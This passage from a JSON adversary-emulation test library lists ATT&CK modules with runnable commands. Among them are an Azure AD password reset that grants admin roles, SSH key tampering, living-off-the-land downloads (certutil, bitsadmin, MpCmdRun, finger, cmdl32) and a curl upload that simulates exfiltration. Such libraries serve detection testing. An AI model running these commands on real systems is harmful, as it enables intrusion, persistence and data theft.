        "command": "Import-Module MSOnline\nImport-Module AzureAD\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\n$targetsecurepw = ConvertTo-SecureString -String \"#{target_password}\" -AsPlainText -Force\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\n\n#Saving the ObjectId of the target_user into a variable\n$target_objid = Get-AzureADUser -filter \"userPrincipalName eq '#{target_user}'\" | Select-Object -ExpandProperty ObjectId\n\n#Reset the password of the target_user\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\n\n#Adding target_user\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\nAdd-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"#{target_user}\"\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module MSOnline\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-MsolService -Credential $credential\nRemove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\nRemove-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\n"
      },
      "variables": [
        {
          "name": "auth_username",
          "description": "Azure AD username used to conduct the adversary activity",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "auth_password",
          "description": "Azure AD password for user auth_username",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "target_user",
          "description": "Name of the user whose password be reset and added to the admin role.",
          "type": "string",
          "default_value": "default"
        },
        {
          "name": "target_password",
          "description": "The password that the user target_user will be reset to.",
          "type": "string",
          "default_value": "Ohn05GeMe#$"
        }
      ],
      "prerequisites": [
        {
          "description": "MSOnline and AzureAD modules must be installed.\n",
          "check_command": "$required_mods = 'AzureAD', 'MSOnline'\n$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)\n$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue\n\nif ($notInstalled) {\n# Prompt for installing the missing ones.\nWrite-Output \"The following PS modules aren't currently installed:\"\n$notInstalled\n  exit 1\n}\n\n else{\n  Write-Output \"All required PS modules are installed\"\n  exit 0\n }\n",
          "install_command": "Install-Module -Name MSOnline -Scope CurrentUser -Force\nInstall-Module -Name AzureAD -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "14f3af20-61f1-45b8-ad31-4637815f3f44",
      "module_name": "Simulate - Post BEC persistence via user password reset followed by user added to company administrator role"
    },
    {
      "index": 634,
      "technique_id": "T1098.004",
      "technique_name": "SSH Authorized Keys",
      "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;\n",
        "elevation_required": false,
        "cleanup_command": "unset ssh_authorized_keys\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "342cc723-127c-4d3a-8292-9c0c6b4ecadc",
      "module_name": "Modify SSH Authorized Keys"
    },
    {
      "index": 635,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Utilize rsync to perform a remote file copy (push)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "Remote path to receive rsync",
          "type": "path",
          "default_value": "/tmp/victim-files"
        },
        {
          "name": "remote_host",
          "description": "Remote host to copy toward",
          "type": "string",
          "default_value": "victim-host"
        },
        {
          "name": "local_path",
          "description": "Path of folder to copy",
          "type": "path",
          "default_value": "/tmp/adversary-rsync/"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "victim"
        }
      ],
      "prerequisites": [
        {
          "description": "rsync must be installed on the machine \n",
          "check_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
        }
      ],
      "rx_module_id": "0fc6e977-cb12-44f6-b263-2824ba917409",
      "module_name": "rsync remote file copy (push)"
    },
    {
      "index": 636,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Utilize rsync to perform a remote file copy (pull)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "Path of folder to copy",
          "type": "path",
          "default_value": "/tmp/adversary-rsync/"
        },
        {
          "name": "remote_host",
          "description": "Remote host to copy from",
          "type": "string",
          "default_value": "adversary-host"
        },
        {
          "name": "local_path",
          "description": "Local path to receive rsync",
          "type": "path",
          "default_value": "/tmp/victim-files"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "adversary"
        }
      ],
      "prerequisites": [
        {
          "description": "rsync must be installed on the machine \n",
          "check_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
        }
      ],
      "rx_module_id": "3180f7d5-52c0-4493-9ea0-e3431a84773f",
      "module_name": "rsync remote file copy (pull)"
    },
    {
      "index": 637,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Utilize scp to perform a remote file copy (push)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "Remote path to receive scp",
          "type": "path",
          "default_value": "/tmp/victim-files/"
        },
        {
          "name": "local_file",
          "description": "Path of file to copy",
          "type": "path",
          "default_value": "/tmp/adversary-scp"
        },
        {
          "name": "remote_host",
          "description": "Remote host to copy toward",
          "type": "string",
          "default_value": "victim-host"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "victim"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "83a49600-222b-4866-80a0-37736ad29344",
      "module_name": "scp remote file copy (push)"
    },
    {
      "index": 638,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Utilize scp to perform a remote file copy (pull)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_host",
          "description": "Remote host to copy from",
          "type": "string",
          "default_value": "adversary-host"
        },
        {
          "name": "local_path",
          "description": "Local path to receive scp",
          "type": "path",
          "default_value": "/tmp/victim-files/"
        },
        {
          "name": "remote_file",
          "description": "Path of file to copy",
          "type": "path",
          "default_value": "/tmp/adversary-scp"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "adversary"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b9d22b9a-9778-4426-abf0-568ea64e9c33",
      "module_name": "scp remote file copy (pull)"
    },
    {
      "index": 639,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Utilize sftp to perform a remote file copy (push)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_path",
          "description": "Remote path to receive sftp",
          "type": "path",
          "default_value": "/tmp/victim-files/"
        },
        {
          "name": "local_file",
          "description": "Path of file to copy",
          "type": "path",
          "default_value": "/tmp/adversary-sftp"
        },
        {
          "name": "remote_host",
          "description": "Remote host to copy toward",
          "type": "string",
          "default_value": "victim-host"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "victim"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f564c297-7978-4aa9-b37a-d90477feea4e",
      "module_name": "sftp remote file copy (push)"
    },
    {
      "index": 640,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Utilize sftp to perform a remote file copy (pull)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_host",
          "description": "Remote host to copy from",
          "type": "string",
          "default_value": "adversary-host"
        },
        {
          "name": "local_path",
          "description": "Local path to receive sftp",
          "type": "path",
          "default_value": "/tmp/victim-files/"
        },
        {
          "name": "remote_file",
          "description": "Path of file to copy",
          "type": "path",
          "default_value": "/tmp/adversary-sftp"
        },
        {
          "name": "username",
          "description": "User account to authenticate on remote host",
          "type": "string",
          "default_value": "adversary"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0139dba1-f391-405e-a4f5-f3989f2c88ef",
      "module_name": "sftp remote file copy (pull)"
    },
    {
      "index": 641,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n",
        "elevation_required": false,
        "cleanup_command": "del #{local_path} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "URL of file to copy",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "local_path",
          "description": "Local path to place file",
          "type": "path",
          "default_value": "RAGLOX-license.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0",
      "module_name": "certutil download (urlcache)"
    },
    {
      "index": 642,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "URL of file to copy",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "local_path",
          "description": "Local path to place file",
          "type": "path",
          "default_value": "RAGLOX-license.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ffd492e3-0455-4518-9fb1-46527c9f241b",
      "module_name": "certutil download (verifyctl)"
    },
    {
      "index": 643,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "bits_job_name",
          "description": "Name of the created BITS job",
          "type": "string",
          "default_value": "qcxjb7"
        },
        {
          "name": "local_path",
          "description": "Local path to place file",
          "type": "path",
          "default_value": "%temp%\\RAGLOX-license.txt"
        },
        {
          "name": "remote_file",
          "description": "URL of file to copy",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b",
      "module_name": "Windows - BITSAdmin BITS Download"
    },
    {
      "index": 644,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{destination_path} -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "URL of file to copy",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "destination_path",
          "description": "Destination path to file",
          "type": "path",
          "default_value": "$env:TEMP\\RAGLOX-license.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "42dc4460-9aa6-45d3-b1a6-3955d34e1fe8",
      "module_name": "Windows - PowerShell Download"
    },
    {
      "index": 645,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"RAGLOXTestFileT1105.js\", true);newfile.WriteLine(\"This is an raglox threat library test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > RAGLOXTestT1105.js\nCScript.exe RAGLOXTestT1105.js //E:JScript\ndel RAGLOXTestT1105.js /Q >nul 2>&1\ndel RAGLOXTestFileT1105.js /Q >nul 2>&1\npopd\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "destination_path",
          "description": "Path to create remote file at. Default is local admin share.",
          "type": "string",
          "default_value": "\\\\localhost\\C$"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2ca61766-b456-4fcf-a35a-1233685e1cad",
      "module_name": "OSTAP Worming Activity"
    },
    {
      "index": 646,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n",
        "elevation_required": true,
        "cleanup_command": "del C:\\T1105.txt >nul 2>&1\ndel C:\\\\svchost.exe >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fa5a2759-41d7-4e13-a19c-e8f28a53566f",
      "module_name": "svchost writing a file to a UNC path"
    },
    {
      "index": 647,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the RAGLOX Threat Library license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}\n",
        "elevation_required": false,
        "cleanup_command": "del #{local_path} >nul 2>&1\ndel %temp%\\MpCmdRun.log >nul 2>&1"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "URL of file to download",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "local_path",
          "description": "Location to save downloaded file",
          "type": "path",
          "default_value": "%temp%\\RAGLOX-license.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Must have a Windows Defender version with MpCmdRun.exe installed",
          "check_command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe /?  >nul 2>&1\n",
          "install_command": "Echo \"A version of Windows Defender with MpCmdRun.exe must be installed manually\""
        }
      ],
      "rx_module_id": "815bef8b-bf91-4b67-be4c-abe4c2a94ccc",
      "module_name": "Download a File with Windows Defender MpCmdRun.exe"
    },
    {
      "index": 648,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Download a remote file using the whois utility\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "remote_host",
          "description": "Remote hostname or IP address",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "remote_port",
          "description": "Remote port to connect to",
          "type": "integer",
          "default_value": 8443
        },
        {
          "name": "output_file",
          "description": "Path of file to save output to",
          "type": "path",
          "default_value": "/tmp/T1105.whois.out"
        },
        {
          "name": "query",
          "description": "Query to send to remote server",
          "type": "string",
          "default_value": "Hello from RAGLOX Threat Library test T1105"
        },
        {
          "name": "timeout",
          "description": "Timeout period before ending process (seconds)",
          "type": "integer",
          "default_value": 1
        }
      ],
      "prerequisites": [
        {
          "description": "The whois and timeout commands must be present\n",
          "check_command": "which whois && which timeout\n",
          "install_command": "echo \"Please install timeout and the whois package\"\n"
        }
      ],
      "rx_module_id": "c99a829f-0bb8-4187-b2c6-d47d1df74cab",
      "module_name": "whois file download"
    },
    {
      "index": 649,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_remote_file",
          "description": "File to download",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt"
        },
        {
          "name": "output_file",
          "description": "File to write to",
          "type": "string",
          "default_value": "LICENSE.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "54a4daf1-71df-4383-9ba7-f1a295d8b6d2",
      "module_name": "File Download via PowerShell"
    },
    {
      "index": 650,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "finger base64_filedata@#{remote_host}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_host",
          "description": "Remote hostname or IP address",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5f507e45-8411-4f99-84e7-e38530c45d01",
      "module_name": "File download with finger.exe on Windows"
    },
    {
      "index": 651,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled #{remote_url}\n",
        "elevation_required": false,
        "cleanup_command": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }\n"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "Location of file to be downloaded.",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1105/T1105.yaml"
        },
        {
          "name": "file_name",
          "description": "Name of the file to be downloaded without extension.",
          "type": "string",
          "default_value": "T1105"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1a02df58-09af-4064-a765-0babe1a0d1e2",
      "module_name": "Download a file with IMEWDBLD.exe"
    },
    {
      "index": 652,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "The following RAGLOX utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{curl_path} -k #{file_download} -o c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} --output c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o c:\\programdata\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o %Temp%\\allthethingsx64.dll\n",
        "elevation_required": false,
        "cleanup_command": "del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\programdata\\allthethingsx64.dll >nul 2>&1\ndel %Temp%\\allthethingsx64.dll >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "file_download",
          "description": "File to download",
          "type": "string",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/rx_modules/T1218.010/bin/AllTheThingsx64.dll"
        },
        {
          "name": "curl_path",
          "description": "path to curl.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\Curl.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Curl must be installed on system.\n",
          "check_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\"\n"
        }
      ],
      "rx_module_id": "2b080b99-0deb-4d51-af0f-833d37c4ca6a",
      "module_name": "Curl Download File"
    },
    {
      "index": 653,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "The following RAGLOX utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{curl_path} -T #{file_path} #{remote_destination}\n#{curl_path} --upload-file #{file_path} #{remote_destination}\n#{curl_path} -d #{file_path} #{remote_destination}\n#{curl_path} --data #{file_path} #{remote_destination}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "curl_path",
          "description": "path to curl.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\Curl.exe"
        },
        {
          "name": "remote_destination",
          "description": "Remote destination",
          "type": "string",
          "default_value": "www.example.com"
        },
        {
          "name": "file_path",
          "description": "File to upload",
          "type": "string",
          "default_value": "c:\\temp\\ragloxtestfile.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Curl must be installed on system.\n",
          "check_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\nExpand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\"\n"
        },
        {
          "description": "A file must be created to upload\n",
          "check_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n",
          "install_command": "echo \"This is an RX Module File\" > #{file_path}\n"
        }
      ],
      "rx_module_id": "635c9a38-6cbf-47dc-8615-3810bc1167cf",
      "module_name": "Curl Upload File"
    },
    {
      "index": 654,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{Path_to_file}\" 1>NUL \n",
        "elevation_required": false,
        "cleanup_command": "del /f/s/q %temp%\\T1105 >nul 2>&1\nrmdir /s/q %temp%\\T1105 >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "Path_to_file",
          "description": "Path to the Batch script",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1105\\src\\T1105.bat"
        }
      ],
      "prerequisites": [
        {
          "description": "#{Path_to_file} must exist on system.\n",
          "check_command": "if (Test-Path \"#{Path_to_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{Path_to_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1105/src/T1105.bat\" -OutFile \"#{Path_to_file}\"\n"
        }
      ],
      "rx_module_id": "d239772b-88e2-4a2e-8473-897503401bcc",
      "module_name": "Download a file with Microsoft Connection Manager Auto-Download"
    },
    {
      "index": 655,
      "technique_id": "T1105",
      "technique_name": "Ingress Tool Transfer",
      "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
